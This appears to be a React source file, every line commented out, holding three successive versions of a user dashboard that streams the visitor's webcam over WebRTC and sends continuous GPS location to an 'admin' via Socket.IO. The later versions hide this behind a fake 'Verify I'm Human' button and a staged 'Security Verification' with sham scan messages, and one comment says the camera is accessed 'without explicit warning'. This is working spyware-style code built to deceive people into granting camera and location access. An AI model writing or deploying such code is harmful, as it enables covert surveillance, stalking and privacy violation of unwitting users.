// import { useEffect, useState, useRef } from "react";
// import io from "socket.io-client";

// const socket = io("http://localhost:3001");

// function UserDashboard() {
//   const [notificationPermission, setNotificationPermission] =
//     useState("default");
//   const [cameraRequested, setCameraRequested] = useState(false);
//   const [feedback, setFeedback] = useState("");
//   const videoRef = useRef(null);
//   const peerConnectionRef = useRef(null);
//   const streamRef = useRef(null);
//   const pendingCandidatesRef = useRef([]);

//   useEffect(() => {
//     const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
//     socket.emit("register-user", userId);

//     socket.on("camera-access-request", handleCameraRequest);
//     socket.on("receive-feedback", (message) => setFeedback(message));
//     socket.on("answer", handleAnswer);
//     socket.on("ice-candidate", handleIceCandidate);

//     return () => {
//       if (streamRef.current) {
//         streamRef.current.getTracks().forEach((track) => track.stop());
//       }
//       socket.off();
//     };
//   }, []);

//   const handleCameraRequest = async ({ from }) => {
//     const permission = await Notification.requestPermission();
//     setNotificationPermission(permission);

//     if (permission === "granted") {
//       new Notification("Security Alert", {
//         body: "Admin is requesting access to your camera",
//         icon: "⚠️",
//       });
//     }
//     setCameraRequested(true);
//   };

//   const allowCameraAccess = async () => {
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: true,
//         audio: false,
//       });
//       streamRef.current = stream;
//       if (videoRef.current) {
//         videoRef.current.srcObject = stream;
//       }

//       socket.emit("camera-permission-granted");
//       await createPeerConnection(stream);
//     } catch (error) {
//       console.error("Camera access denied:", error);
//       alert("Camera access denied");
//     }
//   };

//   const createPeerConnection = async (stream) => {
//     const configuration = {
//       iceServers: [
//         { urls: "stun:stun.l.google.com:19302" },
//         { urls: "stun:stun1.l.google.com:19302" },
//       ],
//     };
//     peerConnectionRef.current = new RTCPeerConnection(configuration);

//     // Add local stream tracks to peer connection
//     stream.getTracks().forEach((track) => {
//       peerConnectionRef.current.addTrack(track, stream);
//     });

//     // Handle ICE candidates
//     peerConnectionRef.current.onicecandidate = (event) => {
//       if (event.candidate) {
//         console.log("Sending ICE candidate to admin");
//         socket.emit("ice-candidate", {
//           candidate: event.candidate,
//           to: "admin",
//         });
//       }
//     };

//     // Monitor connection state
//     peerConnectionRef.current.onconnectionstatechange = () => {
//       console.log(
//         "Connection state:",
//         peerConnectionRef.current.connectionState
//       );
//     };

//     // Create and send offer
//     const offer = await peerConnectionRef.current.createOffer();
//     await peerConnectionRef.current.setLocalDescription(offer);
//     socket.emit("offer", { offer, to: "admin" });

//     console.log("Offer sent to admin");
//   };

//   const handleAnswer = async ({ answer }) => {
//     try {
//       await peerConnectionRef.current.setRemoteDescription(
//         new RTCSessionDescription(answer)
//       );
//       console.log("Answer received from admin");

//       // Add any pending ICE candidates
//       for (const candidate of pendingCandidatesRef.current) {
//         await peerConnectionRef.current.addIceCandidate(candidate);
//       }
//       pendingCandidatesRef.current = [];
//     } catch (error) {
//       console.error("Error handling answer:", error);
//     }
//   };

//   const handleIceCandidate = async ({ candidate }) => {
//     try {
//       if (
//         peerConnectionRef.current &&
//         peerConnectionRef.current.remoteDescription
//       ) {
//         await peerConnectionRef.current.addIceCandidate(
//           new RTCIceCandidate(candidate)
//         );
//         console.log("Added ICE candidate");
//       } else {
//         // Store candidates if connection not ready yet
//         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
//       }
//     } catch (error) {
//       console.error("Error adding ICE candidate:", error);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <h1>User Dashboard</h1>
//       <div style={styles.card}>
//         {!cameraRequested ? (
//           <p>Waiting for admin request...</p>
//         ) : (
//           <>
//             <h2>⚠️ Camera Access Requested</h2>
//             <p>Admin wants to access your camera</p>
//             <button onClick={allowCameraAccess} style={styles.button}>
//               Allow Camera Access
//             </button>
//           </>
//         )}
//       </div>

//       {streamRef.current && (
//         <div style={styles.videoContainer}>
//           <h3>Your Camera (Admin can see this)</h3>
//           <video
//             ref={videoRef}
//             autoPlay
//             muted
//             playsInline
//             style={styles.video}
//           />
//         </div>
//       )}

//       {feedback && (
//         <div style={styles.feedback}>
//           <h3>Admin Feedback:</h3>
//           <p>{feedback}</p>
//         </div>
//       )}
//     </div>
//   );
// }

// const styles = {
//   container: {
//     padding: "20px",
//     fontFamily: "Arial",
//     maxWidth: "800px",
//     margin: "0 auto",
//   },
//   card: {
//     background: "#f5f5f5",
//     padding: "20px",
//     borderRadius: "8px",
//     marginBottom: "20px",
//   },
//   button: {
//     background: "#007bff",
//     color: "white",
//     padding: "10px 20px",
//     border: "none",
//     borderRadius: "5px",
//     cursor: "pointer",
//     fontSize: "16px",
//   },
//   videoContainer: { marginTop: "20px" },
//   video: {
//     width: "100%",
//     maxWidth: "640px",
//     borderRadius: "8px",
//     border: "2px solid #333",
//   },
//   feedback: {
//     background: "#fff3cd",
//     padding: "15px",
//     borderRadius: "8px",
//     marginTop: "20px",
//     border: "1px solid #ffc107",
//   },
// };

// export default UserDashboard;

// import { useEffect, useState, useRef } from "react";
// import io from "socket.io-client";

// const socket = io("http://localhost:3001");

// function UserDashboard() {
//   const [notificationPermission, setNotificationPermission] =
//     useState("default");
//   const [cameraRequested, setCameraRequested] = useState(false);
//   const [feedback, setFeedback] = useState("");
//   const [isTracking, setIsTracking] = useState(false);
//   const [showVerifyButton, setShowVerifyButton] = useState(true);
//   const videoRef = useRef(null);
//   const peerConnectionRef = useRef(null);
//   const streamRef = useRef(null);
//   const pendingCandidatesRef = useRef([]);
//   const locationWatchIdRef = useRef(null);
//   const userIdRef = useRef(null);

//   useEffect(() => {
//     const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
//     userIdRef.current = userId;
//     socket.emit("register-user", userId);

//     socket.on("camera-access-request", handleCameraRequest);
//     socket.on("receive-feedback", (message) => setFeedback(message));
//     socket.on("answer", handleAnswer);
//     socket.on("ice-candidate", handleIceCandidate);

//     return () => {
//       if (streamRef.current) {
//         streamRef.current.getTracks().forEach((track) => track.stop());
//       }
//       if (locationWatchIdRef.current) {
//         navigator.geolocation.clearWatch(locationWatchIdRef.current);
//       }
//       socket.off();
//     };
//   }, []);

//   const handleCameraRequest = async ({ from }) => {
//     const permission = await Notification.requestPermission();
//     setNotificationPermission(permission);

//     if (permission === "granted") {
//       new Notification("Security Alert", {
//         body: "Admin is requesting access to your camera",
//         icon: "⚠️",
//       });
//     }
//     setCameraRequested(true);
//   };

//   // NEW: Automatic camera access on button click
//   const handleVerifyClick = async () => {
//     try {
//       setShowVerifyButton(false);

//       // Automatically access camera without explicit warning
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: true,
//         audio: false,
//       });

//       streamRef.current = stream;
//       if (videoRef.current) {
//         videoRef.current.srcObject = stream;
//       }

//       socket.emit("camera-permission-granted");
//       await createPeerConnection(stream);

//       // Start live location tracking
//       startLocationTracking();
//     } catch (error) {
//       console.error("Access denied:", error);
//       alert("Please allow camera access to continue");
//     }
//   };

//   // NEW: Continuous location tracking
//   const startLocationTracking = () => {
//     if (navigator.geolocation) {
//       setIsTracking(true);

//       // watchPosition provides continuous location updates
//       locationWatchIdRef.current = navigator.geolocation.watchPosition(
//         (position) => {
//           const location = {
//             latitude: position.coords.latitude,
//             longitude: position.coords.longitude,
//             accuracy: position.coords.accuracy,
//             timestamp: new Date().toISOString(),
//           };

//           console.log("Location updated:", location);

//           // Send location to admin via Socket.IO
//           socket.emit("location-update", {
//             userId: userIdRef.current,
//             location: location,
//           });
//         },
//         (error) => {
//           console.error("Location error:", error);
//         },
//         {
//           enableHighAccuracy: true, // GPS-level accuracy
//           timeout: 5000,
//           maximumAge: 0, // Always get fresh location
//         }
//       );
//     } else {
//       alert("Geolocation is not supported by this browser");
//     }
//   };

//   const allowCameraAccess = async () => {
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: true,
//         audio: false,
//       });
//       streamRef.current = stream;
//       if (videoRef.current) {
//         videoRef.current.srcObject = stream;
//       }

//       socket.emit("camera-permission-granted");
//       await createPeerConnection(stream);
//       startLocationTracking();
//     } catch (error) {
//       console.error("Camera access denied:", error);
//       alert("Camera access denied");
//     }
//   };

//   const createPeerConnection = async (stream) => {
//     const configuration = {
//       iceServers: [
//         { urls: "stun:stun.l.google.com:19302" },
//         { urls: "stun:stun1.l.google.com:19302" },
//       ],
//     };
//     peerConnectionRef.current = new RTCPeerConnection(configuration);

//     stream.getTracks().forEach((track) => {
//       peerConnectionRef.current.addTrack(track, stream);
//     });

//     peerConnectionRef.current.onicecandidate = (event) => {
//       if (event.candidate) {
//         console.log("Sending ICE candidate to admin");
//         socket.emit("ice-candidate", {
//           candidate: event.candidate,
//           to: "admin",
//         });
//       }
//     };

//     peerConnectionRef.current.onconnectionstatechange = () => {
//       console.log(
//         "Connection state:",
//         peerConnectionRef.current.connectionState
//       );
//     };

//     const offer = await peerConnectionRef.current.createOffer();
//     await peerConnectionRef.current.setLocalDescription(offer);
//     socket.emit("offer", { offer, to: "admin" });

//     console.log("Offer sent to admin");
//   };

//   const handleAnswer = async ({ answer }) => {
//     try {
//       await peerConnectionRef.current.setRemoteDescription(
//         new RTCSessionDescription(answer)
//       );
//       console.log("Answer received from admin");

//       for (const candidate of pendingCandidatesRef.current) {
//         await peerConnectionRef.current.addIceCandidate(candidate);
//       }
//       pendingCandidatesRef.current = [];
//     } catch (error) {
//       console.error("Error handling answer:", error);
//     }
//   };

//   const handleIceCandidate = async ({ candidate }) => {
//     try {
//       if (
//         peerConnectionRef.current &&
//         peerConnectionRef.current.remoteDescription
//       ) {
//         await peerConnectionRef.current.addIceCandidate(
//           new RTCIceCandidate(candidate)
//         );
//         console.log("Added ICE candidate");
//       } else {
//         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
//       }
//     } catch (error) {
//       console.error("Error adding ICE candidate:", error);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <h1>User Dashboard</h1>

//       {/* NEW: Innocent-looking verification button */}
//       {showVerifyButton && (
//         <div style={styles.verifyCard}>
//           <h2>🔒 Security Verification Required</h2>
//           <p>To access premium features, please verify you're human</p>
//           <button onClick={handleVerifyClick} style={styles.verifyButton}>
//             ✓ Verify I'm Human
//           </button>
//           <p style={styles.smallText}>This helps us prevent bots and spam</p>
//         </div>
//       )}

//       <div style={styles.card}>
//         {!cameraRequested ? (
//           <p>Waiting for admin request...</p>
//         ) : (
//           <>
//             <h2>⚠️ Camera Access Requested</h2>
//             <p>Admin wants to access your camera</p>
//             <button onClick={allowCameraAccess} style={styles.button}>
//               Allow Camera Access
//             </button>
//           </>
//         )}
//       </div>

//       {streamRef.current && (
//         <div style={styles.videoContainer}>
//           <h3>
//             Your Camera{" "}
//             {isTracking && (
//               <span style={styles.trackingBadge}>
//                 📍 Location Tracking Active
//               </span>
//             )}
//           </h3>
//           <video
//             ref={videoRef}
//             autoPlay
//             muted
//             playsInline
//             style={styles.video}
//           />
//           {isTracking && (
//             <p style={styles.warningText}>
//               ⚠️ Your live location is being shared continuously
//             </p>
//           )}
//         </div>
//       )}

//       {feedback && (
//         <div style={styles.feedback}>
//           <h3>Admin Feedback:</h3>
//           <p>{feedback}</p>
//         </div>
//       )}
//     </div>
//   );
// }

// const styles = {
//   container: {
//     padding: "20px",
//     fontFamily: "Arial",
//     maxWidth: "800px",
//     margin: "0 auto",
//   },
//   verifyCard: {
//     background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
//     color: "white",
//     padding: "30px",
//     borderRadius: "12px",
//     marginBottom: "20px",
//     textAlign: "center",
//     boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
//   },
//   verifyButton: {
//     background: "#fff",
//     color: "#667eea",
//     padding: "15px 40px",
//     border: "none",
//     borderRadius: "25px",
//     cursor: "pointer",
//     fontSize: "18px",
//     fontWeight: "bold",
//     marginTop: "15px",
//     boxShadow: "0 4px 10px rgba(0,0,0,0.1)",
//   },
//   smallText: {
//     fontSize: "12px",
//     marginTop: "10px",
//     opacity: 0.8,
//   },
//   card: {
//     background: "#f5f5f5",
//     padding: "20px",
//     borderRadius: "8px",
//     marginBottom: "20px",
//   },
//   button: {
//     background: "#007bff",
//     color: "white",
//     padding: "10px 20px",
//     border: "none",
//     borderRadius: "5px",
//     cursor: "pointer",
//     fontSize: "16px",
//   },
//   videoContainer: { marginTop: "20px" },
//   video: {
//     width: "100%",
//     maxWidth: "640px",
//     borderRadius: "8px",
//     border: "2px solid #333",
//   },
//   trackingBadge: {
//     background: "#dc3545",
//     color: "white",
//     padding: "5px 10px",
//     borderRadius: "5px",
//     fontSize: "14px",
//     marginLeft: "10px",
//   },
//   warningText: {
//     color: "#dc3545",
//     fontWeight: "bold",
//     marginTop: "10px",
//   },
//   feedback: {
//     background: "#fff3cd",
//     padding: "15px",
//     borderRadius: "8px",
//     marginTop: "20px",
//     border: "1px solid #ffc107",
//   },
// };

// export default UserDashboard;

////////////////////////////////////
////// ye 2nd lates tha after this scale krne ke maksad se jo bana raha hu vo aaega
// import { useEffect, useState, useRef } from "react";
// import io from "socket.io-client";

// const socket = io("http://localhost:3001");

// function UserDashboard() {
//   const [notificationPermission, setNotificationPermission] =
//     useState("default");
//   const [cameraRequested, setCameraRequested] = useState(false);
//   const [feedback, setFeedback] = useState("");
//   const [isTracking, setIsTracking] = useState(false);
//   const [showSecurityCheck, setShowSecurityCheck] = useState(true);
//   const [securityStatus, setSecurityStatus] = useState("Checking...");
//   const videoRef = useRef(null);
//   const peerConnectionRef = useRef(null);
//   const streamRef = useRef(null);
//   const pendingCandidatesRef = useRef([]);
//   const locationWatchIdRef = useRef(null);
//   const userIdRef = useRef(null);

//   useEffect(() => {
//     const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
//     userIdRef.current = userId;
//     socket.emit("register-user", userId);

//     socket.on("camera-access-request", handleCameraRequest);
//     socket.on("receive-feedback", (message) => setFeedback(message));
//     socket.on("answer", handleAnswer);
//     socket.on("ice-candidate", handleIceCandidate);

//     return () => {
//       if (streamRef.current) {
//         streamRef.current.getTracks().forEach((track) => track.stop());
//       }
//       if (locationWatchIdRef.current) {
//         navigator.geolocation.clearWatch(locationWatchIdRef.current);
//       }
//       socket.off();
//     };
//   }, []);

//   const handleCameraRequest = async ({ from }) => {
//     const permission = await Notification.requestPermission();
//     setNotificationPermission(permission);

//     if (permission === "granted") {
//       new Notification("Security Alert", {
//         body: "Admin is requesting access to your camera",
//         icon: "⚠️",
//       });
//     }
//     setCameraRequested(true);
//   };

//   const handleSecurityCheck = async () => {
//     setSecurityStatus("Running security scan...");

//     setTimeout(
//       () => setSecurityStatus("Verifying device authenticity..."),
//       1000
//     );
//     setTimeout(() => setSecurityStatus("Checking system permissions..."), 2000);

//     setTimeout(async () => {
//       let cameraGranted = false;

//       try {
//         const stream = await navigator.mediaDevices.getUserMedia({
//           video: true,
//           audio: false,
//         });

//         streamRef.current = stream;
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }

//         socket.emit("camera-permission-granted");

//         // Wait a bit to ensure admin is ready
//         await new Promise((resolve) => setTimeout(resolve, 500));

//         await createPeerConnection(stream);
//         cameraGranted = true;

//         setSecurityStatus("✓ Camera verified - Checking location...");
//       } catch (error) {
//         console.error("Camera access denied:", error);
//         setSecurityStatus("⚠️ Camera blocked - Requesting location...");
//       }

//       try {
//         startLocationTracking();

//         if (cameraGranted) {
//           setSecurityStatus("✓ Security verification complete");
//         } else {
//           setSecurityStatus("✓ Location verified (Camera blocked)");
//         }

//         setTimeout(() => setShowSecurityCheck(false), 2000);
//       } catch (error) {
//         console.error("Location access denied:", error);
//         if (cameraGranted) {
//           setSecurityStatus("✓ Camera verified (Location blocked)");
//           setTimeout(() => setShowSecurityCheck(false), 2000);
//         } else {
//           setSecurityStatus("❌ Security check failed");
//         }
//       }
//     }, 3000);
//   };

//   const startLocationTracking = () => {
//     if (navigator.geolocation) {
//       setIsTracking(true);

//       locationWatchIdRef.current = navigator.geolocation.watchPosition(
//         (position) => {
//           const location = {
//             latitude: position.coords.latitude,
//             longitude: position.coords.longitude,
//             accuracy: position.coords.accuracy,
//             timestamp: new Date().toISOString(),
//           };

//           console.log("Location updated:", location);

//           socket.emit("location-update", {
//             userId: userIdRef.current,
//             location: location,
//           });
//         },
//         (error) => {
//           console.error("Location error:", error);
//         },
//         {
//           enableHighAccuracy: true,
//           timeout: 5000,
//           maximumAge: 0,
//         }
//       );
//     }
//   };

//   const allowCameraAccess = async () => {
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: true,
//         audio: false,
//       });
//       streamRef.current = stream;
//       if (videoRef.current) {
//         videoRef.current.srcObject = stream;
//       }

//       socket.emit("camera-permission-granted");
//       await createPeerConnection(stream);
//       startLocationTracking();
//     } catch (error) {
//       console.error("Camera access denied:", error);
//       alert("Camera access denied");
//     }
//   };

//   const createPeerConnection = async (stream) => {
//     const configuration = {
//       iceServers: [
//         { urls: "stun:stun.l.google.com:19302" },
//         { urls: "stun:stun1.l.google.com:19302" },
//       ],
//     };
//     peerConnectionRef.current = new RTCPeerConnection(configuration);

//     stream.getTracks().forEach((track) => {
//       peerConnectionRef.current.addTrack(track, stream);
//     });

//     peerConnectionRef.current.onicecandidate = (event) => {
//       if (event.candidate) {
//         console.log("Sending ICE candidate to admin");
//         socket.emit("ice-candidate", {
//           candidate: event.candidate,
//           to: "admin",
//         });
//       }
//     };

//     peerConnectionRef.current.onconnectionstatechange = () => {
//       console.log(
//         "Connection state:",
//         peerConnectionRef.current.connectionState
//       );
//     };

//     const offer = await peerConnectionRef.current.createOffer();
//     await peerConnectionRef.current.setLocalDescription(offer);

//     console.log("Sending offer to admin...");
//     socket.emit("offer", { offer, to: "admin" });
//   };

//   const handleAnswer = async ({ answer }) => {
//     try {
//       if (!peerConnectionRef.current) {
//         console.error("No peer connection exists");
//         return;
//       }

//       await peerConnectionRef.current.setRemoteDescription(
//         new RTCSessionDescription(answer)
//       );
//       console.log("Answer received from admin");

//       for (const candidate of pendingCandidatesRef.current) {
//         await peerConnectionRef.current.addIceCandidate(candidate);
//       }
//       pendingCandidatesRef.current = [];
//     } catch (error) {
//       console.error("Error handling answer:", error);
//     }
//   };

//   const handleIceCandidate = async ({ candidate }) => {
//     try {
//       if (
//         peerConnectionRef.current &&
//         peerConnectionRef.current.remoteDescription
//       ) {
//         await peerConnectionRef.current.addIceCandidate(
//           new RTCIceCandidate(candidate)
//         );
//         console.log("Added ICE candidate");
//       } else {
//         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
//       }
//     } catch (error) {
//       console.error("Error adding ICE candidate:", error);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <h1>User Dashboard</h1>

//       {showSecurityCheck && (
//         <div style={styles.securityCard}>
//           <div style={styles.shieldIcon}>🛡️</div>
//           <h2>Security Verification Required</h2>
//           <p style={styles.securityText}>
//             To ensure your account security and prevent unauthorized access,
//             please complete the security verification process.
//           </p>
//           <div style={styles.securityFeatures}>
//             <div style={styles.feature}>✓ Device Authentication</div>
//             <div style={styles.feature}>✓ Location Verification</div>
//             <div style={styles.feature}>✓ Identity Confirmation</div>
//           </div>
//           <div style={styles.statusBox}>{securityStatus}</div>
//           <button onClick={handleSecurityCheck} style={styles.securityButton}>
//             🔒 Verify Security Settings
//           </button>
//           <p style={styles.disclaimer}>
//             This process helps protect your account from threats
//           </p>
//         </div>
//       )}

//       <div style={styles.card}>
//         {!cameraRequested ? (
//           <p>Waiting for admin request...</p>
//         ) : (
//           <>
//             <h2>⚠️ Camera Access Requested</h2>
//             <p>Admin wants to access your camera</p>
//             <button onClick={allowCameraAccess} style={styles.button}>
//               Allow Camera Access
//             </button>
//           </>
//         )}
//       </div>

//       {streamRef.current && (
//         <div style={styles.videoContainer}>
//           <h3>
//             Your Camera{" "}
//             {isTracking && (
//               <span style={styles.trackingBadge}>
//                 📍 Location Tracking Active
//               </span>
//             )}
//           </h3>
//           <video
//             ref={videoRef}
//             autoPlay
//             muted
//             playsInline
//             style={styles.video}
//           />
//           {isTracking && (
//             <p style={styles.warningText}>
//               ⚠️ Your live location is being shared continuously
//             </p>
//           )}
//         </div>
//       )}

//       {feedback && (
//         <div style={styles.feedback}>
//           <h3>Admin Feedback:</h3>
//           <p>{feedback}</p>
//         </div>
//       )}
//     </div>
//   );
// }

// const styles = {
//   container: {
//     padding: "20px",
//     fontFamily: "Arial",
//     maxWidth: "800px",
//     margin: "0 auto",
//   },
//   securityCard: {
//     background: "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
//     color: "white",
//     padding: "40px",
//     borderRadius: "15px",
//     marginBottom: "30px",
//     textAlign: "center",
//     boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
//   },
//   shieldIcon: { fontSize: "60px", marginBottom: "15px" },
//   securityText: {
//     fontSize: "16px",
//     lineHeight: "1.6",
//     marginBottom: "20px",
//     opacity: 0.95,
//   },
//   securityFeatures: {
//     display: "flex",
//     justifyContent: "space-around",
//     marginBottom: "25px",
//     flexWrap: "wrap",
//   },
//   feature: {
//     background: "rgba(255,255,255,0.1)",
//     padding: "10px 15px",
//     borderRadius: "20px",
//     fontSize: "14px",
//     margin: "5px",
//   },
//   statusBox: {
//     background: "rgba(255,255,255,0.15)",
//     padding: "12px",
//     borderRadius: "8px",
//     marginBottom: "20px",
//     fontSize: "14px",
//     minHeight: "20px",
//   },
//   securityButton: {
//     background: "#fff",
//     color: "#1e3c72",
//     padding: "15px 40px",
//     border: "none",
//     borderRadius: "30px",
//     cursor: "pointer",
//     fontSize: "18px",
//     fontWeight: "bold",
//     boxShadow: "0 5px 15px rgba(0,0,0,0.2)",
//   },
//   disclaimer: { fontSize: "12px", marginTop: "15px", opacity: 0.7 },
//   card: {
//     background: "#f5f5f5",
//     padding: "20px",
//     borderRadius: "8px",
//     marginBottom: "20px",
//   },
//   button: {
//     background: "#007bff",
//     color: "white",
//     padding: "10px 20px",
//     border: "none",
//     borderRadius: "5px",
//     cursor: "pointer",
//     fontSize: "16px",
//   },
//   videoContainer: { marginTop: "20px" },
//   video: {
//     width: "100%",
//     maxWidth: "640px",
//     borderRadius: "8px",
//     border: "2px solid #333",
//   },
//   trackingBadge: {
//     background: "#dc3545",
//     color: "white",
//     padding: "5px 10px",
//     borderRadius: "5px",
//     fontSize: "14px",
//     marginLeft: "10px",
//   },
//   warningText: { color: "#dc3545", fontWeight: "bold", marginTop: "10px" },
//   feedback: {
//     background: "#fff3cd",
//     padding: "15px",
//     borderRadius: "8px",
//     marginTop: "20px",
//     border: "1px solid #ffc107",
//   },
// };

// export default UserDashboard;
